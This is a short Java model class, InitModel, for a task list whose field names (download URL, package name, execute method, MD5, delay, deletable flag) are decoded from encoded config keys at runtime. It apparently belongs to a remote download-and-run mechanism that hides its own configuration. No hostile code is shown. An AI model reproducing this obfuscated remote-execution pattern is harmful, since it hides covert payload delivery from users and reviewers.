package com.seecoms.data.opera;

import java.util.List;

import com.seecoms.data.util.Config;
import com.seecoms.data.util.SecUtil;

public class InitModel {
    public long interval;
    public List<TaskBean> tasks;

    public static final String CODE = SecUtil.decode(Config.KEY_CODE);
    public static final String INTERVAL = SecUtil.decode(Config.KEY_INTERVAL);
    public static final String TASKS = SecUtil.decode(Config.KEY_TASKS);
    public static final String ID = SecUtil.decode(Config.KEY_ID);
    public static final String NAME = SecUtil.decode(Config.KEY_NAME);
    public static final String TYPE = SecUtil.decode(Config.KEY_TYPE);
    public static final String CREATETIME = SecUtil.decode(Config.KEY_CREATETIME);
    public static final String DATA = SecUtil.decode(Config.KEY_DATA);
    public static final String DELAY = SecUtil.decode(Config.KEY_DELAY);
    public static final String DOWNLOADURL = SecUtil.decode(Config.KEY_DOWNLOADURL);
    public static final String CANDELETE = SecUtil.decode(Config.KEY_CANDELETE);
    public static final String MD5 = SecUtil.decode(Config.KEY_MD5);
    public static final String FILENAME = SecUtil.decode(Config.KEY_FILENAME);
    public static final String PACKAGENAME = SecUtil.decode(Config.KEY_PACKAGENAME);
    public static final String EXEMETHOD = SecUtil.decode(Config.KEY_EXEMETHOD);
}
